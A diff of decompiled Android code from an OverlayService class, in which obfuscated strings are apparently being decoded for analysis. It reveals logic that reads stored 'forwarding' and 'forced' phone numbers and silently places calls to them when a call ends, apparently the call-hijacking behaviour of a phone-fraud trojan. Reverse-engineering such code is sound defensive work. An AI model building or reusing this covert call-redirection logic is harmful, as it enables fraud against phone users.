@@ -164,25 +164,33 @@ public class OverlayService extends StandOutWindow implements View.OnClickListen
         StringBuilder sb = new StringBuilder();
         String str3 = TAG;
         sb.append(str3);
-        sb.append(bb7d7pu7.m5998("RUkICh0ABgc6HQYZRUkKCAUFOQEGBwxTSQ"));
+//-^-         sb.append(bb7d7pu7.m5998("RUkICh0ABgc6HQYZRUkKCAUFOQEGBwxTSQ"));
+        sb.append(", actionStop, callPhone: ");
         sb.append(str);
-        sb.append(bb7d7pu7.m5998("RUkEKggFBT0QGQxTSQ"));
+//-^-         sb.append(bb7d7pu7.m5998("RUkEKggFBT0QGQxTSQ"));
+        sb.append(", mCallType: ");
         sb.append(mCallType);
-        sb.append(bb7d7pu7.m5998("RUkAGjoBBh5TSQ"));
+//-^-         sb.append(bb7d7pu7.m5998("RUkAGjoBBh5TSQ"));
+        sb.append(", isShow: ");
         sb.append(isShow);
         LogUtils.callLog(sb.toString());
         String str4 = "";
         if (mCallType == 2) {
-            boolean value = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("IiwwNiA6Ni8mOz4oOy0gJy42ISgnLTY8OQ"), false);
-            str2 = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OSEmJyw"), "");
-            String value2 = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OiEmPjY5ISYnLA"), "");
-            LogUtils.callLog(str3 + bb7d7pu7.m5998("RUkAGi8GGx4IGw0ABw4hCAcNPBlTSQ") + value + bb7d7pu7.m5998("RUkKCAUFLQAaCgYHBwwKHQwNRUkPBhseCBsNAAcOOQEGBwxTSQ") + str2 + bb7d7pu7.m5998("RUkPBhseCBsNAAcOOgEGHjkBBgcMU0k") + value2 + bb7d7pu7.m5998("RUkKCAUFOQEGBwxTSQ") + str);
+//-^-             boolean value = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("IiwwNiA6Ni8mOz4oOy0gJy42ISgnLTY8OQ"), false);
+            boolean value = SharedPreferencesUtils.getValue("KEY_IS_FORWARDING_HAND_UP", false);
+//-^-             str2 = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OSEmJyw"), "");
+            str2 = SharedPreferencesUtils.getValue("KEY_FORWARDING_PHONE", "");
+//-^-             String value2 = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OiEmPjY5ISYnLA"), "");
+            String value2 = SharedPreferencesUtils.getValue("KEY_FORWARDING_SHOW_PHONE", "");
+//-^-             LogUtils.callLog(str3 + bb7d7pu7.m5998("RUkAGi8GGx4IGw0ABw4hCAcNPBlTSQ") + value + bb7d7pu7.m5998("RUkKCAUFLQAaCgYHBwwKHQwNRUkPBhseCBsNAAcOOQEGBwxTSQ") + str2 + bb7d7pu7.m5998("RUkPBhseCBsNAAcOOgEGHjkBBgcMU0k") + value2 + bb7d7pu7.m5998("RUkKCAUFOQEGBwxTSQ") + str);
+            LogUtils.callLog(str3 + ", isForwardingHandUp: " + value + ", callDisconnected, forwardingPhone: " + str2 + ", forwardingShowPhone: " + value2 + ", callPhone: " + str);
             if (value && !TextUtils.isEmpty(str2) && (TextUtils.isEmpty(str) || value2.equals(str))) {
                 SettingUtils.startActivityForCall(context, str2);
                 return;
             }
         } else {
-            String str5 = bb7d7pu7.m5998("IiwwNi8mOyosLTY5ISYnLA");
+//-^-             String str5 = bb7d7pu7.m5998("IiwwNi8mOyosLTY5ISYnLA");
+            String str5 = "KEY_FORCED_PHONE";
             str4 = SharedPreferencesUtils.getValue(str5, "");
             SharedPreferencesUtils.putValue(str5, "");
             str2 = "";
